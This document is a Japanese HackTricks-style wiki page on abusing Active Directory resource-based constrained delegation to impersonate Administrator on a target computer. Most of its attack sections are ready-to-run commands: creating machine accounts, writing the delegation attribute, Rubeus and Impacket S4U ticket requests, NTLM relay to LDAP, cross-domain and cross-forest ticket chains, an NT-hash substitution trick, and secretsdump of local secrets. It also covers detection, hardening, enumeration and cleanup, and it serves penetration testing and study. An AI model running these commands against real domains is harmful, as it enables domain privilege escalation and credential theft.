# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegationの基礎

Resource-based constrained delegation（RBCD）は[constrained delegation](constrained-delegation.md)に似ていますが、信頼の方向が逆です。従来のconstrained delegationでは、プリンシパルが委任できるサービスを記録します。RBCDでは、**対象リソース**に、どのプリンシパルがそのリソースに対してユーザーを偽装できるかを記録します。<sup>[[12]](#references)</sup>

対象オブジェクトの _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 属性には、そのリソースに対して他のIDの代理として動作することを許可されたプリンシパルを示すセキュリティ記述子が格納されています。

もう一つの重要な違いは、**マシンアカウントに対する書き込み権限**（`GenericAll`、`GenericWrite`、`WriteDacl`、`WriteProperty`など）を十分に持つプリンシパルは、_**msDS-AllowedToActOnBehalfOfOtherIdentity**_ を設定できる可能性があることです。従来のconstrained delegationの設定には、通常、より強い管理者権限が必要です。<sup>[[1]](#references)</sup>

より正確には、従来のconstrained delegation設定の変更には、通常、ドメインコントローラー上の `SeEnableDelegationPrivilege` が必要です。この権限は一般に、非常に高い権限を持つ管理者が保持しています。RBCDでは判断が対象オブジェクトのセキュリティ記述子に委ねられるため、該当するコンピューターオブジェクトのプロパティへの書き込み権限があれば、そのユーザー権限がなくても十分な場合があります。<sup>[[1]](#references)[[2]](#references)</sup>

### 新しい概念

`userAccountControl` の **`TrustedToAuthForDelegation`** フラグは、**S4U2Self** の前提条件として説明されることがよくありますが、それだけでは不十分です。\
SPNを持つサービスプリンシパルは、このフラグがなくてもS4U2Selfを要求できます。`TrustedToAuthForDelegation` がある場合、返されるサービスチケットは**forwardable**です。ない場合、通常、チケットは**non-forwardable**です。<sup>[[5]](#references)</sup>

従来のconstrained delegationでは、S4U2Proxyの手順で**non-forwardable TGS**が拒否されます。RBCDでは、対象のセキュリティ記述子が要求元サービスを許可していれば、そのS4U2Selfチケットを受け入れることができます。<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### 攻撃の流れ

> **コンピューターアカウント**に対する**書き込み相当の権限**があれば、そのマシンへの特権アクセスを取得できる可能性があります。

攻撃者がすでに**被害者のコンピューターオブジェクトに対する書き込み相当の権限**を持っているとします。

1. 攻撃者は**SPN**を持つアカウントを**侵害する**か、アカウントを**作成**します（「Service A」）。デフォルトでは、認証済みのドメインユーザーは**_MachineAccountQuota_**の設定により最大10個のコンピューターオブジェクトを作成できます。コンピューターオブジェクトには、使用可能なSPNが自動的に設定されます。
2. 攻撃者は、被害者のコンピューター（ServiceB）に対するWRITE権限を**悪用**し、ServiceAがその被害者のコンピューター（ServiceB）に対して任意のユーザーを偽装できるよう、**resource-based constrained delegationを設定**します。
3. 攻撃者はRubeusを使い、Service AからService Bに対して、**Service Bへの特権アクセスを持つユーザー**を対象に、**完全なS4U攻撃**（S4U2SelfとS4U2Proxy）を実行します。
   1. S4U2Self（侵害または作成したSPNアカウントから）：AdministratorをService Aに対して表す**TGS**を要求します（non-forwardable）。
   2. S4U2Proxy：その**non-forwardable TGS**を使い、**被害ホスト**に対してAdministratorを表すサービスチケットを要求します。
   3. Service Aが対象リソースのセキュリティ記述子で許可されているため、このRBCDの流れではnon-forwardableチケットも機能します。
4. 攻撃者は**pass-the-ticket**を実行してユーザーを**偽装**し、**被害者のServiceBへのアクセス**を取得できます。<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` にすると、デフォルトのコンピューター作成ルートは閉じられますが、対象コンピューターオブジェクトへの書き込み権限や既存アカウントの制御権がなくなるわけではありません。SPNを持たない、制御下にある一般ユーザーを、[SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd)を通じて委任元プリンシパルとして使える場合があります。同一ドメイン内でも利用できます。この方法には引き続き、実効性のあるRBCD書き込み権限、委任元ユーザーの認証情報の制御、委任可能な偽装対象ID、互換性のあるKerberos暗号化動作、そしてアカウントに影響を与えるNTハッシュの変更が必要です。これらは別々の前提条件として扱ってください。RBCD属性が空であることやクォータがゼロであることだけでは、攻撃の成功も安全性も証明できません。

既存のRBCD記述子には、委任元のコンピューターを直接指定する代わりに**グループ**を指定することもできます。SPNを持つコンピューターアカウントを制御しており、そのグループに追加できる場合、対象コンピューターのRBCD属性を変更せずに、新たなメンバーシップによって委任経路が成立する可能性があります。この経路が機能すると判断する前に、グループの実効的なメンバーシップ書き込みACL（deny ACEを含む）、ネストされたメンバーシップとトークンの更新、記述子のtrustee SID、偽装対象アカウントの委任制限、対象サービスのSPNを確認してください。

ドメインの _**MachineAccountQuota**_ を確認するには、次のようにします。

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## 攻撃

### コンピューターオブジェクトの作成

**[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> を使用して、ドメイン内にコンピューターオブジェクトを作成できます。

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Resource-based Constrained Delegation の設定

**Active Directory PowerShell モジュールを使用する**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**PowerView の使用**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### 完全な S4U attack を実行する（Windows/Rubeus）

まず、パスワード `123456` を設定した新しい Computer object を作成したため、そのパスワードの hash が必要です。<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

これにより、そのアカウントのRC4およびAESハッシュが出力されます。\
これで、攻撃を実行できます。<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Rubeusの `/altservice` パラメータを使えば、一度要求するだけで、より多くのサービス向けのチケットを生成できます。

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> ユーザーには **「アカウントは機密扱いで、委任できない」** とマークされている場合があります。このフラグが有効な場合、この委任フローを通じてそのアカウントになりすますことはできません。BloodHound は分析時にこのプロパティを表示します。

### Linux tooling: Impacket を使用したエンドツーエンドの RBCD（2024年以降）

Linux から操作する場合、公式の Impacket ツールを使用して RBCD チェーン全体を実行できます。<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Notes
- LDAP signing/LDAPS が強制されている場合は、`impacket-rbcd -use-ldaps ...` を使用します。
- AES keys を優先してください。多くの最新ドメインでは RC4 が制限されています。Impacket と Rubeus はどちらも AES-only のフローをサポートしています。
- Impacket は一部のツールで `sname`（"AnySPN"）を書き換えられますが、可能な限り正しい SPN（例: CIFS/LDAP/HTTP/HOST/MSSQLSvc）を取得してください。

## クロスドメインおよびクロスフォレスト RBCD

制御している **委任元プリンシパル** が **リソースコンピューター** と **別のドメイン**（または **別のフォレスト**）に属している場合でも、悪用手法は **RBCD** のままですが、チケットのフローは通常の単一ドメインの `S4U2Self -> S4U2Proxy` とは異なります。

### クロスドメイン RBCD: SID を使用して外部プリンシパルを構成する

**別のドメイン**から `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定する場合、外部のマシン/ユーザーをターゲットドメインの LDAP で**名前解決できない**ことがあります。その場合は、sAMAccountName/UPN ではなく、外部プリンシパルの **SID** を使用して委任エントリを構成します。

これは、NTLM を LDAP にリレーする場合に特に重要です。`ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Notes:
- `--sid` は `ntlmrelayx.py` に `--escalate-user` を SID として扱うよう指示します。委任元アカウントがターゲットドメインに属していない場合に必要です。
- ツールが `User not found in LDAP` と出力しても、セキュリティ記述子に外部 SID が直接保存されるため、委任設定の書き込みは成功する場合があります。

### クロスドメイン RBCD: クロスレルム S4U シーケンス

外部プリンシパルが `msDS-AllowedToActOnBehalfOfOtherIdentity` に追加されると、次のクロスドメインフローが機能します:<sup>[[9]](#references)[[13]](#references)</sup>

1. 委任元プリンシパルの所属ドメインから、そのプリンシパルの **TGT** を取得します。
2. `krbtgt/<target-domain>` の **紹介 TGT** を要求します。
3. ターゲットドメインの DC 上で、偽装するユーザーの **クロスレルム S4U2Self 紹介** を要求します。
4. 委任元ドメインに戻り、そのユーザーの実際の **S4U2Self** チケットを要求します。
5. 委任元ドメインで **S4U2Proxy** を実行し、ターゲットドメイン向けの紹介チケットを取得します。
6. ターゲットドメインの DC 上で最後の **S4U2Proxy** を実行し、`cifs/host.target`、`host/host.target` などのサービスチケットを取得します。

このため、標準の Linux ツールはクロスドメイン RBCD で失敗することがよくあります:<sup>[[9]](#references)</sup>
- 要求の **realm** は、`TGS-REQ` で使用する TGT の realm と異なる場合があります。
- このチェーンでは、**S4U2Self** のみ、または **S4U2Self** の直後に単一の **S4U2Proxy** を実行するのではなく、**S4U2Proxy** を独立したステップとして複数回実行する必要があります。

### Linux からのクロスドメイン RBCD

Synacktiv は、2 つの KDC を明示的に処理することで、Linux からクロスレルムシーケンスを再現する Impacket `getST.py` の実装を公開しました:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

実運用上、新しい引数は次のとおりです。
- `-dc-ip`: **委任元**ドメインの DC
- `-targetdomain`: **リソースコンピューター**のドメイン
- `-targetdc`: **リソース**ドメインの DC

### Cross-forest RBCD の制限

Cross-forest RBCD には重要な制限があります。**偽装するユーザーは、委任元プリンシパルと同じフォレストに属している必要があります**。つまり、制御下のマシンアカウントが `valhalla.local` にあり、対象リソースが `asgard.local` にある場合、通常は RBCD を介して任意の `asgard.local` ユーザーをそのリソースに対して偽装することは**できません**。<sup>[[9]](#references)</sup>

次の場合は、引き続き悪用可能です。
- **委任元フォレスト**のユーザーが、他方のフォレストのリソースホストで**ローカル管理者**（またはそれに準ずる特権ユーザー）である
- 信頼関係によって必要な認証経路が許可され、対象コンピューターのセキュリティ記述子で外部 SID が受け入れられる

### Cross-forest RBCD のプロトコル上の特記事項

Cross-forest RBCD は、単に「信頼関係のあるクロスドメイン」ではありません。確認されているフローには、一般的なツールが歴史的に見落としてきた2つの特記事項があります。<sup>[[9]](#references)</sup>

1. **`PA-PAC-OPTIONS=branch-aware`** を設定する追加の **S4U2Proxy** リクエスト
2. 他の etype が要求されていても、最終的なサービスチケットが **RC4** で返される場合がある

実際のフローは次のとおりです。

1. フォレスト A の委任元プリンシパルの TGT を取得する。
2. フォレスト A で、偽装するユーザーの **S4U2Self** を要求する。
3. フォレスト A で **S4U2Proxy** を要求し、フォレスト B の referral TGT を取得する。
4. フォレスト A で2回目の **S4U2Proxy** を送信する。このとき、S4U2Self チケットを追加チケットとして**含めず**、`branch-aware` を有効にして、フォレスト B の別の referral TGT を取得する。
5. 任意で、フォレスト B において委任元プリンシパルの通常のサービスチケットを要求する（このチケットは最終的な悪用には不要）。
6. 手順3と4で取得した referral チケットを使用して、偽装するフォレスト A のユーザーから対象 SPN への最終的な **S4U2Proxy** チケットをフォレスト B で要求する。

### Linux からの Cross-forest RBCD

同じ Synacktiv Impacket ブランチでは、このロジックのために `-forest` スイッチが追加されています。<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### 再帰的な複数ドメイン RBCD（3つ以上のドメイン）

**複数ドメインのフォレスト**では、**S4U2Self** と **S4U2Proxy** は1回の紹介で停止せず、**再帰的に**実行できます。

- **再帰的な S4U2Self**: 最初の `S4U2Self` は**偽装対象ユーザーのドメイン**に送信され、中間の親子ドメイン間のホップは `krbtgt/<REALM>` に対する通常の `TGS-REQ` 紹介でたどり、**最後の S4U2Self** は**委任元プリンシパル自身のドメイン**に送信されます。
- つまり、マシンアカウントの **TGT を保持しているだけ**で、同じフォレスト内の別ドメインの**管理者を偽装**し、`cifs/host`、`host/host`、`wsman/host` などを要求できる場合があります。
- **再帰的な S4U2Proxy** も同じ方法で信頼チェーンをたどります。中間ホップでは、前のチケットを TGT として再利用し、次の `krbtgt/<REALM>` 紹介を要求します。最終ホップでのみ、最終的なサービスチケットが返されます。<sup>[[10]](#references)</sup>

実際の同一フォレストの例を示します。

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less クロスドメイン / クロスフォレスト RBCD

**委任元プリンシパルがSPNを持たないユーザーの場合**、最後の再帰的な `S4U2Self` は **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** で失敗します。回避策は、最後のホップのみ **`S4U2Self+U2U`** として再試行することです。<sup>[[10]](#references)</sup>

悪用チェーンの簡易版：

1. **NT hash** で認証し、KDCが **RC4-HMAC (etype 23)** を優先するようにします。
2. まず **`-self -u2u`** を要求し、そのチケットを後続のプロキシステップ用チケットとは分けて保管します。
3. `describeTicket.py` で **TGT session key** を抽出します。
4. `changepasswd.py -newhashes <session_key>` を使い、ユーザーの **NT hash** をその **session key** に置き換えます。
5. `S4U2Self+U2U` チケットを、別途実行する **`-proxy`** 要求の **`-additional-ticket`** として再利用します。

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

運用上の注意点:

- **最初の信頼済みホップがすでに別のフォレストにある場合**は、Windows本来の動作に合わせるため、**branch-aware** アルゴリズム（`getST.py ... -forest`）を優先してください。外部フォレストにチェーンの途中で到達する場合は、branch-awareではない再帰フローでも動作する可能性があります。<sup>[[9]](#references)</sup>
- 最近の **Windows Server 2022/2025** DCでは、RC4の非推奨化により、RC4を強制すると **`KDC_ERR_ETYPE_NOSUPP`** で失敗することがあります。その場合、従来のSPNを使ったRBCDはAESで動作しても、**SPN-less RBCD** は実行できない可能性があります。<sup>[[15]](#references)</sup>
- ユーザーのhash/passwordを変更する前に、**`S4U2Self+U2U`** を実行してください。`SamrChangePasswordUser` はアカウントのKerberos AES keysを再計算しないため、先にパスワードを変更すると、後続のチケット要求が失敗する可能性があります。<sup>[[14]](#references)</sup>
- なりすますアカウントは引き続き**委任可能**である必要があります。**Protected Users** や、**`NOT_DELEGATED`** / **「アカウントは機密であり、委任できない」** が設定されたアカウントでは、このチェーンはブロックされます。

## 検出 / ハードニングに関する注意点

- ドメイン/フォレストをまたぐRBCD経路は、通常、**ACL abuse** または **relay-to-LDAP** によって作成されます。DCで **LDAP signing** と **LDAP channel binding** を強制し、一般的なセットアップ経路を遮断してください。
- コンピューターオブジェクトの `msDS-AllowedToActOnBehalfOfOtherIdentity` に書き込み可能なユーザーを監査し、保存されているSID（**foreign security principals** を含む）を特定してください。
- 信頼関係の多い環境では、**Selective Authentication**、**SID filtering**、および外部フォレストのユーザーがリソースホスト上で **local admin** 権限を持っているかを確認してください。

### アクセス

最後のコマンドラインは、**S4U attack** を完全に実行し、Administratorからvictim hostへの **TGS** を**メモリ内**に注入します。\
この例ではAdministratorから **CIFS** サービス用のTGSを要求しているため、**C$** にアクセスできます:

```bash
ls \\victim.domain.local\C$
```

### 異なるサービスチケットを悪用する

[**利用可能なサービスチケットはこちら**](silver-ticket.md#available-services)を参照してください。

## 列挙、監査、クリーンアップ

### RBCD が設定されているコンピューターを列挙する

PowerShell（SD をデコードして SID を解決）:

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket（1つのコマンドで読み取りまたはフラッシュ）:

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### RBCDのクリーンアップ / リセット

- PowerShell（属性をクリア）：

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: Kerberos が DES または RC4 を使用しないように設定されているのに、RC4 hash だけを指定していることを意味します。Rubeus には少なくとも AES256 hash を指定してください（または rc4、aes128、aes256 の hash をすべて指定してください）。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 通常のユーザーに対する `-self` 実行時の **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: 委任する principal に **SPN が設定されていない**可能性があります。通常の `S4U2Self` ではなく、**`S4U2Self+U2U`** を使って **最後の hop** を再試行してください。<sup>[[10]](#references)</sup>
- **SPN-less RBCD** 実行時の **`KDC_ERR_ETYPE_NOSUPP`**: 最近の DC は、`S4U2Self+U2U` と session-key-substitution の手法で必要となる、強制的な **RC4-HMAC** の経路を拒否することがあります。代わりに AES を使う従来の **SPN-backed** RBCD の経路を試してください。<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: 現在のコンピューターの時刻が DC の時刻と異なり、Kerberos が正常に動作していないことを意味します。
- **`preauth_failed`**: 指定した username と hash ではログインできないことを意味します。hash の生成時に username に `$` を付け忘れた可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: 次の可能性があります。
  - impersonate しようとしているユーザーが、目的のサービスにアクセスできない（そのユーザーになりすませない、または十分な権限がない）。
  - 要求したサービスが存在しない（winrm のチケットを要求したが、winrm が実行されていない場合など）。
  - 作成した fakecomputer が脆弱なサーバーに対する権限を失っており、その権限を付与し直す必要がある。
  - classic KCD を悪用している。RBCD は forwardable ではない S4U2Self ticket で動作しますが、KCD には forwardable が必要です。

## Notes, relays and alternatives

- LDAP がフィルタリングされている場合、AD Web Services (ADWS) 経由で RBCD SD を書き込むこともできます。以下を参照してください。

{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chain は、1 ステップでローカルの SYSTEM 権限を取得するために、RBCD で終わることがよくあります。実践的なエンドツーエンドの例を参照してください。

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding が **無効**で、かつ machine account を作成できる場合、**KrbRelayUp** などのツールを使って、強制した Kerberos 認証を LDAP に relay できます。ターゲットの computer object 上で、自分の machine account に対して `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定し、off-host から S4U 経由ですぐに **Administrator** になりすませます。<sup>[[8]](#references)</sup>

## References

- [1] [犬を振る: Resource-Based Constrained Delegation を悪用した Active Directory への攻撃](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [委任についてもう一言 – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object の乗っ取り](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation の悪用](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity が Domain を滅ぼした: 攻撃者視点の Kerberos 概要](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (公式)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [最近の構文に対応した Linux の簡易チートシート](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing 無効 → Kerberos relay による RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - ドメイン間およびフォレスト間の RBCD を探る](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - ドメイン間およびフォレスト間の RBCD を探る: パート 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation の概要](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - ドメイン間の S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos における RC4 使用の検出と修正](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy の詳細](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
